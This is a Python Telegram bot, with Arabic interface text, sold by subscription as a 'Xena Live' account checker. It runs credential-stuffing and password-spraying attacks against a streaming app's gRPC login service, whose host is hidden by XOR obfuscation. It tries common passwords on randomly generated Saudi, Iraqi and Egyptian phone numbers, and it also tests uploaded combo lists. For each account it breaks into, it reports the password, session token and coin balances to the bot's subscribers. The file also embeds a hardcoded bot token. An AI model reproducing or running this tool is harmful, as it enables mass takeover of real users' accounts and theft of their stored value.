#!/usr/bin/env python3
import os
import sys
import time
import random
import hashlib
import threading
import json
from datetime import datetime, timedelta
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import grpc

TOKEN = os.getenv("BOT_TOKEN", "8844579780:AAHI93U8a0StTBhwuCEbZJR7qzHpy2BdS3g")
bot = telebot.TeleBot(TOKEN)

# آيدي الأدمن (يمكنك تعديله أو وضعه عبر المتغيرات البيئية)
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8795120325").split(",") if x.strip().isdigit()]

SUBS_FILE = "subscribers.json"

# ══════════════════════════════════════════════════════════
#  إدارة الاشتراكات وقاعدة البيانات المحلية
# ══════════════════════════════════════════════════════════
def load_subs():
    if not os.path.exists(SUBS_FILE):
        return {}
    try:
        with open(SUBS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_subs(subs):
    try:
        with open(SUBS_FILE, "w", encoding="utf-8") as f:
            json.dump(subs, f, ensure_ascii=False, indent=4)
    except:
        pass

def is_active_subscriber(user_id):
    if user_id in ADMIN_IDS:
        return True
    subs = load_subs()
    str_id = str(user_id)
    if str_id in subs:
        expiry_str = subs[str_id]["expiry"]
        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        if datetime.now() < expiry_date:
            return True
    return False

# ══════════════════════════════════════════════════════════
#  XOR obfuscation
# ══════════════════════════════════════════════════════════
def _xd(b):
    return bytes(c ^ 0x5A for c in b).decode()

_grpcHost  = bytes([0x28,0x2a,0x39,0x77,0x32,0x2d,0x74,0x22,0x3f,0x34,0x3b,0x36,0x33,0x2c,0x3f,0x74,0x37,0x3f,0x60,0x6e,0x6e,0x69])
_svcPrefix = bytes([0x75,0x3d,0x28,0x2a,0x39,0x74,0x36,0x35,0x3d,0x33,0x34,0x74,0x16,0x35,0x3d,0x33,0x34,0x09,0x3f,0x28,0x2c,0x33,0x39,0x3f])
_pkg       = bytes([0x39,0x35,0x37,0x74,0x22,0x2a,0x3b,0x28,0x2e,0x23,0x74,0x3b,0x34,0x3e,0x28,0x35,0x33,0x3e,0x3b,0x2a,0x2a])
_userAgent = bytes([0x3d,0x28,0x2a,0x39,0x77,0x30,0x3b,0x2c,0x3b,0x77,0x35,0x31,0x32,0x2e,0x2e,0x2a,0x75,0x6b,0x74,0x6c,0x6b,0x74,0x6a])

GRPC_HOST  = _xd(_grpcHost)
SVC_PREFIX = _xd(_svcPrefix)
PKG        = _xd(_pkg)
APP_VER    = "2003003"
APP_VN     = "2.3.3.1"

PASSWORDS = [
    "Aa123456@","Aa123456","Aa12345678","Aa12345678@",
    "Aa1234567@","Aa1234567","Aa123123@","Aa123123",
    "Aa12341234","Aa@123456","Aa@123123","Aa@112233",
    "123456","1234567","12345678","Password1","P@ssw0rd"
]

COUNTRY_MAP = {
    "SA": {"code":"966","prefs":["50","51","53","54","55","56","57","58","59"],"ext":7},
    "IQ": {"code":"964","prefs":["770","771","772","773","780","781","790"],"ext":7},
    "EG": {"code":"20", "prefs":["10","11","12","15"],"ext":8},
}

def _varint(v):
    b = bytearray()
    while v > 0x7F:
        b.append((v & 0x7F) | 0x80)
        v >>= 7
    b.append(v & 0x7F)
    return bytes(b)

def _fstr(n, val):
    d = val.encode()
    return _varint((n << 3) | 2) + _varint(len(d)) + d

def _fint(n, val):
    return _varint(n << 3) + _varint(val)

def _fbytes(n, data):
    return _varint((n << 3) | 2) + _varint(len(data)) + data

def _pvarint(data, pos):
    val = shift = 0
    while pos < len(data):
        b = data[pos]; pos += 1
        val |= (b & 0x7F) << shift
        if not (b & 0x80): break
        shift += 7
    return val, pos

def _proto(data):
    fields, i = [], 0
    while i < len(data):
        tag, i = _pvarint(data, i)
        if not tag: break
        fn, wt = tag >> 3, tag & 7
        if wt == 0:
            v, i = _pvarint(data, i)
            fields.append((fn, 0, v, None))
        elif wt == 2:
            ln, i = _pvarint(data, i)
            end = i + ln
            if end > len(data): break
            fields.append((fn, 2, 0, data[i:end]))
            i = end
        else: break
    return fields

def _fget(fields, n):
    for f in fields:
        if f[0] == n: return f
    return None

def _sim_info():
    return (_fint(1,454) + _fstr(2,"00") + _fstr(3,"HK") + _fstr(4,"CSL") + _fstr(5,"CSL"))

def _build_login(phone, password, country):
    return (_fstr(1, phone) + _fstr(2, hashlib.md5(password.encode()).hexdigest()) + _fstr(5, country) + _fbytes(6, _sim_info()))

def _rand_hex(n):
    return ''.join(random.choices('0123456789abcdef', k=n))

def _uuid():
    b = bytearray(os.urandom(16))
    b[6] = (b[6] & 0x0f) | 0x40
    b[8] = (b[8] & 0x3f) | 0x80
    h = b.hex()
    return f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}"

def _make_meta(did):
    ts = str(int(time.time() * 1000))
    return [
        ("lang", "ar"), ("version", APP_VER), ("vc", APP_VER), ("vn", APP_VN),
        ("trace_id", _uuid()), ("os", "android"), ("sys_version", "android-10"),
        ("model", "CPH2469"), ("mcc", "454"), ("locale", "ar_SA"), ("net_type", "6"),
        ("pkg", PKG), ("issue_channel", "1"), ("did", did), ("timezone", "8"),
        ("request_time_s", ts), ("device_level", "HIGH"), ("idfa", _uuid()),
    ]

class GrpcClient:
    def __init__(self):
        self.did = _rand_hex(16)
        opts = [("grpc.keepalive_time_ms", 20000), ("grpc.max_reconnect_backoff_ms", 5000)]
        creds = grpc.ssl_channel_credentials()
        self._ch = grpc.secure_channel(GRPC_HOST, creds, options=opts)
        self._login = self._ch.unary_unary(SVC_PREFIX + "/PhoneLogin", request_serializer=lambda x: x, response_deserializer=lambda x: x)
        self._info = self._ch.unary_unary("/grpc.user.UserService/GetUserInfo", request_serializer=lambda x: x, response_deserializer=lambda x: x)
        self._profile = self._ch.unary_unary("/grpc.user.UserService/GetUserProfile", request_serializer=lambda x: x, response_deserializer=lambda x: x)
        self._balance = self._ch.unary_unary("/grpc.purchase.PurchaseService/GetBalance", request_serializer=lambda x: x, response_deserializer=lambda x: x)

    def call(self, stub, payload, extra_meta=None, timeout=10.0):
        meta = list(_make_meta(self.did))
        if extra_meta: meta.extend(extra_meta)
        if payload is None: payload = b""
        try:
            resp = stub(payload, metadata=meta, timeout=timeout)
            return resp, None
        except grpc.RpcError as e:
            return None, f"{e.code().name}: {e.details()}"

    def close(self):
        try: self._ch.close()
        except: pass

def _parse_login(data):
    if not data: return {"status": "error"}
    fn, wt = data[0] >> 3, data[0] & 7
    if fn == 2 and wt == 0:
        top = _proto(data)
        r = {"ok": True, "status": "hit", "uid": "", "token": "", "country": "", "shortUID": 0}
        f = _fget(top, 2)
        if f: r["shortUID"] = f[2]
        for fld_n in (3, 4):
            f = _fget(top, fld_n)
            if f and f[3]:
                s = f[3].decode(errors="ignore")
                s_clean = "".join(c for c in s if c.isalnum() or c in "_-.")
                if len(s_clean) >= 20 and not r["token"]: 
                    r["token"] = s_clean
        f = _fget(top, 8)
        if f and f[3]: r["country"] = f[3].decode(errors="replace")
        f = _fget(top, 10)
        if f and f[3]:
            s = f[3].decode(errors="replace")
            if s.isdigit(): r["uid"] = s
        return r
    return {"status": "fail"}

def _find_vip(data):
    for fn, wt, iv, bv in _proto(data):
        if wt == 2 and bv:
            try:
                s = bv.decode(errors="replace")
                if s.startswith("VIP Lv"): return s
            except: pass
            sub = _find_vip(bv)
            if sub: return sub
    return ""

def _fetch_balance(cli, short_uid, token):
    uid_s = str(short_uid)
    extra = [("x-auth-token", token), ("uid", uid_s)]
    data, err = cli.call(cli._balance, None, extra_meta=extra, timeout=8.0)
    if err or not data: return 0, 0, 0
    dia = coins = gold = 0
    for fn, wt, iv, _ in _proto(data):
        if wt == 0:
            if fn == 1: dia = iv
            if fn == 2: coins = iv
            if fn == 3: gold = iv
    return dia, coins, gold

def _fetch_info(cli, short_uid, token):
    if not short_uid or not token: return {}
    uid_s = str(short_uid)
    body = _fint(1, short_uid)
    extra = [("x-auth-token", token), ("uid", uid_s)]

    data, err = cli.call(cli._info, body, extra_meta=extra, timeout=8.0)
    if err or not data: return {}
    top = _proto(data)
    f2 = _fget(top, 2)
    if not f2 or not f2[3]: return {}

    inner = _proto(f2[3])
    info = {"ok": True}
    f = _fget(inner, 3); info["nickname"] = f[3].decode(errors="replace").strip() if f and f[3] else ""
    f = _fget(inner, 5); info["country"] = f[3].decode(errors="replace") if f and f[3] else ""
    f = _fget(inner, 8); info["xp"] = f[2] if f else 0
    f = _fget(inner, 12)
    if f and f[2] > 0:
        info["regDate"] = datetime.fromtimestamp(f[2]).strftime("%Y-%m-%d")

    data2, err2 = cli.call(cli._profile, body, extra_meta=extra, timeout=8.0)
    info["vipLevel"] = _find_vip(data2) if not err2 and data2 else ""
    info["diamonds"], info["coins"], info["gold"] = _fetch_balance(cli, short_uid, token)
    return info

def _gen_phone(cc):
    c = COUNTRY_MAP.get(cc, COUNTRY_MAP["SA"])
    pref = random.choice(c["prefs"])
    ext = ''.join(str(random.randint(0, 9)) for _ in range(c["ext"]))
    local = pref + ext
    return c["code"] + local, "0" + local

user_scanners = {}
user_states = {}

def get_main_keyboard(chat_id, running=False):
    markup = InlineKeyboardMarkup()
    is_admin = chat_id in ADMIN_IDS
    
    if not running:
        markup.add(
            InlineKeyboardButton("🚀 الفحص العشوائي (SA)", callback_data="start_sa"),
            InlineKeyboardButton("🚀 الفحص العشوائي (IQ)", callback_data="start_iq")
        )
        markup.add(
            InlineKeyboardButton("🔍 فحص حساب مفرد", callback_data="single_check_menu"),
            InlineKeyboardButton("📁 فحص ملف كومبو (TXT)", callback_data="combo_menu")
        )
    else:
        markup.add(
            InlineKeyboardButton("⏹ إيقاف الفحص الحالي", callback_data="stop_checker")
        )
        
    if is_admin:
        markup.add(InlineKeyboardButton("⚙️ لوحة تحكم الأدمن", callback_data="admin_panel"))
        
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states.pop(chat_id, None)
    
    if not is_active_subscriber(chat_id):
        bot.send_message(
            chat_id,
            "❌ **عذراً، لست مشتركاً مفَعلاً أو انتهت مدة اشتراكك.**\nيرجى التواصل مع إدارة البوت لتفعيل حسابك وإعطائك الصلاحية.",
            parse_mode="Markdown"
        )
        return

    is_running = user_scanners.get(chat_id, {}).get("is_running", False)
    markup = get_main_keyboard(chat_id, is_running)
    bot.send_message(
        chat_id, 
        "🤖 **أهلاً بك في لوحة تحكم فاحص Xena Live**\n\nاختر العملية المطلوبة من الأزرار الشفافة بالأسفل:",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['add'])
def cmd_add_sub(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n`/add <user_id> <days>`", parse_mode="Markdown")
        return
    
    try:
        target_id = str(parts[1])
        days = int(parts[2])
    except ValueError:
        bot.reply_to(message, "❌ الآيدي أو الأيام يجب أن تكون أرقام صحيحة.")
        return

    subs = load_subs()
    expiry_date = datetime.now() + timedelta(days=days)
    subs[target_id] = {
        "expiry": expiry_date.strftime("%Y-%m-%d %H:%M:%S")
    }
    save_subs(subs)
    bot.reply_to(message, f"✅ تم تفعيل الاشتراك للمستخدم `{target_id}` لمدة `{days}` أيام بنجاح.\nينتهي في: `{subs[target_id]['expiry']}`", parse_mode="Markdown")

@bot.message_handler(commands=['del'])
def cmd_del_sub(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n`/del <user_id>`", parse_mode="Markdown")
        return
    
    target_id = str(parts[1])
    subs = load_subs()
    if target_id in subs:
        del subs[target_id]
        save_subs(subs)
        bot.reply_to(message, f"🗑 تم حذف اشتراك المستخدم `{target_id}` بنجاح.", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ هذا المستخدم غير موجود في قائمة المشتركين.")

@bot.message_handler(commands=['subs'])
def cmd_list_subs(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    subs = load_subs()
    if not subs:
        bot.reply_to(message, "ℹ️ لا يوجد مشتركين حالياً.")
        return
    
    text = "📋 **قائمة المشتركين المفعلين:**\n\n"
    for uid, data in subs.items():
        text += f"• آيدي: `{uid}`\n  ينتهي في: `{data['expiry']}`\n\n"
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data

    if not is_active_subscriber(chat_id):
        bot.answer_callback_query(call.id, "❌ انتهت صلاحية اشتراكك!", show_alert=True)
        return

    if data == "admin_panel":
        if chat_id not in ADMIN_IDS:
            bot.answer_callback_query(call.id, "❌ أمر مخصص للأدمن فقط!")
            return
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="⚙️ **لوحة تحكم الأدمن:**\n\nلإدارة المشتركين استخدم الأوامر التالية في الدردشة:\n• لتفعيل مشترك: `/add <user_id> <الأيام>`\n• لحذف مشترك: `/del <user_id>`\n• لعرض المشتركين: `/subs`",
            reply_markup=markup,
            parse_mode="Markdown"
        )

    elif data == "single_check_menu":
        user_states[chat_id] = "waiting_for_single_account"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🔍 **وضع فحص حساب مفرد**\n\nأرسل الآن الحساب بالصيغة التالية:\n`رقم_الهاتف:كلمة_المرور`\n\n*(مثال: `9647718221131:Aa123456@`)*",
            reply_markup=markup,
            parse_mode="Markdown"
        )

    elif data == "combo_menu":
        user_states[chat_id] = "waiting_for_combo_file"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="📁 **وضع فحص ملف كومبو (Combo)**\n\nأرسل الآن ملف نصي (`.txt`) يحتوي على الحسابات (كل سطر حساب):\n`رقم_الهاتف:كلمة_المرور`",
            reply_markup=markup,
            parse_mode="Markdown"
        )

    elif data == "back_to_main":
        user_states.pop(chat_id, None)
        is_running = user_scanners.get(chat_id, {}).get("is_running", False)
        markup = get_main_keyboard(chat_id, is_running)
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🤖 **أهلاً بك في لوحة تحكم فاحص Xena Live**\n\nاختر العملية المطلوبة من الأزرار الشفافة بالأسفل:",
            reply_markup=markup,
            parse_mode="Markdown"
        )

    elif data.startswith("start_"):
        if user_scanners.get(chat_id, {}).get("is_running", False):
            bot.answer_callback_query(call.id, "⚠️ لديك فحص يعمل بالفعل!")
            return
        
        cc = data.split("_")[1].upper()
        user_scanners[chat_id] = {
            "is_running": True,
            "checked": 0,
            "hits": 0,
            "errors": 0,
            "last_error": "لا يوجد",
            "start_time": time.time(),
            "cc": cc
        }

        bot.answer_callback_query(call.id, f"🚀 بدأ فحصك العشوائي لدولة {cc}")
        threading.Thread(target=run_user_scanner, args=(chat_id, call.message.message_id, cc), daemon=True).start()

    elif data == "stop_checker":
        if not user_scanners.get(chat_id, {}).get("is_running", False):
            bot.answer_callback_query(call.id, "⚠️ فحصك متوقف أساساً.")
            return
        
        user_scanners[chat_id]["is_running"] = False
        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص بنجاح.")
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="⏹ **تم إيقاف عملية الفحص بنجاح.**",
                reply_markup=get_main_keyboard(chat_id, False),
                parse_mode="Markdown"
            )
        except:
            pass

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if not is_active_subscriber(chat_id):
        return

    if user_states.get(chat_id) == "waiting_for_combo_file":
        doc = message.document
        if not doc.file_name.lower().endswith('.txt'):
            bot.reply_to(message, "❌ يرجى إرسال ملف نصي بصيغة `.txt` فقط.")
            return
        
        if user_scanners.get(chat_id, {}).get("is_running", False):
            bot.reply_to(message, "⚠️ لديك عملية فحص تعمل بالفعل!")
            return

        try:
            file_info = bot.get_file(doc.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            file_path = f"temp_combo_{chat_id}.txt"
            with open(file_path, "wb") as f:
                f.write(downloaded_file)
            
            user_states.pop(chat_id, None)
            wait_msg = bot.reply_to(message, "📁 **تم استلام الملف بنجاح، جاري بدء فحص الكومبو...**", parse_mode="Markdown")
            
            user_scanners[chat_id] = {
                "is_running": True,
                "checked": 0,
                "hits": 0,
                "errors": 0,
                "last_error": "لا يوجد",
                "start_time": time.time(),
            }
            
            threading.Thread(target=run_combo_scanner, args=(chat_id, wait_msg.message_id, file_path), daemon=True).start()
        except Exception as e:
            bot.reply_to(message, f"⚠️ حدث خطأ أثناء تحميل الملف: `{str(e)}`", parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def handle_text_messages(message):
    chat_id = message.chat.id
    if not is_active_subscriber(chat_id):
        return

    if user_states.get(chat_id) == "waiting_for_single_account":
        text = message.text.strip()
        if ":" not in text:
            bot.reply_to(message, "❌ صيغة غير صحيحة. يرجى الإرسال بالشكل التالي:\n`رقم_الهاتف:كلمة_المرور`", parse_mode="Markdown")
            return

        parts = text.split(":", 1)
        raw_phone = parts[0].strip().replace("+", "").replace("-", "")
        raw_phone = "".join(filter(str.isdigit, raw_phone))
        password = parts[1].strip()

        country = "SA"
        formatted_phone = raw_phone

        if raw_phone.startswith("966"):
            country = "SA"
        elif raw_phone.startswith("964"):
            country = "IQ"
        elif raw_phone.startswith("20"):
            country = "EG"
        elif raw_phone.startswith("0") or len(raw_phone) == 9:
            country = "SA"
            if raw_phone.startswith("0"):
                formatted_phone = "966" + raw_phone[1:]
            else:
                formatted_phone = "966" + raw_phone

        wait_msg = bot.reply_to(message, f"⏳ جاري فحص الحساب [دولة: {country}] الرقم: `{formatted_phone}`...")

        def process_single():
            cli = GrpcClient()
            try:
                payload = _build_login(formatted_phone, password, country)
                data, err = cli.call(cli._login, payload)
                
                if err or not data:
                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"❌ **فشل الاتصال أو رفض الطلب!**\n🔍 **سبب الخطأ:** `{err or 'استجابة فارغة من الخادم'}`", parse_mode="Markdown")
                    cli.close()
                    return

                res = _parse_login(data)
                if res.get("status") == "hit":
                    acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
                    
                    hit_msg = (
                        f"🎯 **تم صيد وفحص الحساب بنجاح! (Hit)**\n"
                        f"{'─'*32}\n"
                        f"📱 **الرقم**: `{formatted_phone}`\n"
                        f"🔑 **الباسورد**: `{password}`\n"
                        f"🌍 **الدولة**: `{country}`\n"
                        f"🆔 **UID**: `{res.get('uid', '')}`\n"
                        f"🔢 **Short ID**: `{res.get('shortUID', '')}`\n"
                    )
                    if acct.get("nickname"): hit_msg += f"👤 **الاسم**: `{acct['nickname']}`\n"
                    if acct.get("vipLevel"): hit_msg += f"🏆 **مستوى VIP**: `{acct['vipLevel']}`\n"
                    if acct.get("gold", 0) > 0: hit_msg += f"💎 **الذهب**: `{acct['gold']}`\n"
                    if acct.get("diamonds", 0) > 0: hit_msg += f"💠 **الألماس**: `{acct['diamonds']}`\n"
                    if acct.get("coins", 0) > 0: hit_msg += f"🪙 **العملات**: `{acct['coins']}`\n"
                    if acct.get("xp", 0) > 0: hit_msg += f"⚡ **XP**: `{acct['xp']}`\n"
                    if acct.get("regDate"): hit_msg += f"📅 **تاريخ التسجيل**: `{acct['regDate']}`\n"
                    
                    if res.get("token"):
                        tok = res["token"][:40] + "..." if len(res["token"]) > 40 else res["token"]
                        hit_msg += f"🔐 **Token**: `{tok}`\n"
                    
                    hit_msg += f"{'─'*32}"
                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=hit_msg, parse_mode="Markdown")
                else:
                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"❌ **الحساب خطأ أو كلمة المرور غير صحيحة!**\nالرقم: `{formatted_phone}`", parse_mode="Markdown")
            except Exception as e:
                bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"⚠️ خطأ استثنائي أثناء المعالجة: `{str(e)}`", parse_mode="Markdown")
            finally:
                cli.close()

        threading.Thread(target=process_single, daemon=True).start()

def run_combo_scanner(chat_id, message_id, file_path):
    cli = GrpcClient()
    last_update_time = 0

    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
    except Exception as e:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء قراءة ملف الكومبو: `{str(e)}`", parse_mode="Markdown")
        cli.close()
        return

    total_lines = len(lines)
    state = user_scanners[chat_id]

    for line in lines:
        if not user_scanners.get(chat_id, {}).get("is_running", False):
            break
        
        line = line.strip()
        if not line or ":" not in line:
            continue
        
        parts = line.split(":", 1)
        raw_phone = parts[0].strip().replace("+", "").replace("-", "")
        raw_phone = "".join(filter(str.isdigit, raw_phone))
        password = parts[1].strip()

        if not raw_phone or not password:
            continue

        country = "SA"
        formatted_phone = raw_phone
        if raw_phone.startswith("966"):
            country = "SA"
        elif raw_phone.startswith("964"):
            country = "IQ"
        elif raw_phone.startswith("20"):
            country = "EG"
        elif raw_phone.startswith("0") or len(raw_phone) == 9:
            country = "SA"
            if raw_phone.startswith("0"):
                formatted_phone = "966" + raw_phone[1:]
            else:
                formatted_phone = "966" + raw_phone

        payload = _build_login(formatted_phone, password, country)
        data, err = cli.call(cli._login, payload)
        
        state["checked"] += 1
        if err:
            state["errors"] += 1
            state["last_error"] = str(err)
        elif data:
            res = _parse_login(data)
            if res.get("status") == "hit":
                state["hits"] += 1
                acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
                hit_msg = (
                    f"🎯 **COMBO HIT FOUND!**\n"
                    f"{'─'*32}\n"
                    f"📱 **الرقم**: `{formatted_phone}`\n"
                    f"🔑 **الباسورد**: `{password}`\n"
                    f"🌍 **الدولة**: `{country}`\n"
                    f"🆔 **UID**: `{res.get('uid', '')}`\n"
                    f"🔢 **Short ID**: `{res.get('shortUID', '')}`\n"
                )
                if acct.get("nickname"): hit_msg += f"👤 **الاسم**: `{acct['nickname']}`\n"
                if acct.get("vipLevel"): hit_msg += f"🏆 **مستوى VIP**: `{acct['vipLevel']}`\n"
                if acct.get("gold", 0) > 0: hit_msg += f"💎 **الذهب**: `{acct['gold']}`\n"
                if acct.get("diamonds", 0) > 0: hit_msg += f"💠 **الألماس**: `{acct['diamonds']}`\n"
                if acct.get("coins", 0) > 0: hit_msg += f"🪙 **العملات**: `{acct['coins']}`\n"
                bot.send_message(chat_id, hit_msg, parse_mode="Markdown")

        current_time = time.time()
        if current_time - last_update_time >= 2.0:
            last_update_time = current_time
            elapsed = int(current_time - state["start_time"])
            speed = state["checked"] / max(elapsed, 1)
            
            status_text = (
                f"📁 **جاري فحص ملف الكومبو...**\n\n"
                f"📊 **الإحصائيات المباشرة:**\n"
                f"• تم فحص: `{state['checked']} / {total_lines}`\n"
                f"• الصيد الصحيح (Hits): `{state['hits']}` 🎯\n"
                f"• الأخطاء: `{state['errors']}` ⚠️\n"
                f"• سبب آخر خطأ: `{state.get('last_error', 'لا يوجد')}` 🔍\n"
                f"• السرعة: `{speed:.1f} فحص/ثانية` ⚡\n"
                f"• الوقت المنقضي: `{elapsed} ثانية` ⏱"
            )
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=status_text,
                    reply_markup=get_main_keyboard(chat_id, True),
                    parse_mode="Markdown"
                )
            except:
                pass

    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except:
        pass

    cli.close()
    try:
        final_state = user_scanners.get(chat_id, {"checked": 0, "hits": 0})
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"⏹ **انتهى فحص ملف الكومبو بنجاح.**\nنتائجك النهائية:\n• إجمالي الفحص: `{final_state.get('checked', 0)}`\n• الصيد: `{final_state.get('hits', 0)}`",
            reply_markup=get_main_keyboard(chat_id, False),
            parse_mode="Markdown"
        )
    except:
        pass

def run_user_scanner(chat_id, message_id, cc):
    cli = GrpcClient()
    last_update_time = 0

    while user_scanners.get(chat_id, {}).get("is_running", False):
        try:
            phone, first_pw = _gen_phone(cc)
            for pw in [first_pw] + PASSWORDS:
                if not user_scanners.get(chat_id, {}).get("is_running", False): 
                    break
                
                payload = _build_login(phone, pw, cc)
                data, err = cli.call(cli._login, payload)
                
                state = user_scanners[chat_id]
                state["checked"] += 1

                if err:
                    state["errors"] += 1
                    state["last_error"] = str(err)
                elif data:
                    res = _parse_login(data)
                    if res.get("status") == "hit":
                        state["hits"] += 1
                        acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
                        hit_msg = (f"🎯 **HIT FOUND! [عشوائي]**\n\n"
                                   f"📱 Phone: `{phone}`\n"
                                   f"🔑 Pass: `{pw}`\n"
                                   f"🆔 UID: `{res.get('uid')}`\n"
                                   f"🔢 Short ID: `{res.get('shortUID')}`\n"
                                   f"👤 Name: `{acct.get('nickname', '')}`\n"
                                   f"🏆 VIP: `{acct.get('vipLevel', '')}`")
                        bot.send_message(chat_id, hit_msg, parse_mode="Markdown")
                        break

                current_time = time.time()
                if current_time - last_update_time >= 2.0:
                    last_update_time = current_time
                    elapsed = int(current_time - state["start_time"])
                    speed = state["checked"] / max(elapsed, 1)
                    
                    status_text = (
                        f"🚀 **جاري فحص دولة [{cc}] عشوائياً...**\n\n"
                        f"📊 **إحصائياتك المباشرة:**\n"
                        f"• تم فحص: `{state['checked']}` رقم\n"
                        f"• الصيد الصحيح (Hits): `{state['hits']}` 🎯\n"
                        f"• الأخطاء: `{state['errors']}` ⚠️\n"
                        f"• سبب آخر خطأ: `{state.get('last_error', 'لا يوجد')}` 🔍\n"
                        f"• السرعة: `{speed:.1f} فحص/ثانية` ⚡\n"
                        f"• الوقت المنقضي: `{elapsed} ثانية` ⏱"
                    )
                    try:
                        bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=message_id,
                            text=status_text,
                            reply_markup=get_main_keyboard(chat_id, True),
                            parse_mode="Markdown"
                        )
                    except:
                        pass
        except Exception as e:
            state = user_scanners.get(chat_id)
            if state:
                state["last_error"] = str(e)
            time.sleep(1)

    cli.close()
    try:
        final_state = user_scanners.get(chat_id, {"checked": 0, "hits": 0})
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"⏹ **توقف الفحص العشوائي نهائياً.**\nنتائجك النهائية:\n• إجمالي الفحص: `{final_state.get('checked', 0)}`\n• الصيد: `{final_state.get('hits', 0)}`",
            reply_markup=get_main_keyboard(chat_id, False),
            parse_mode="Markdown"
        )
    except:
        pass

if __name__ == "__main__":
    print("Bot is running with Combo file upload support...")
    bot.infinity_polling()
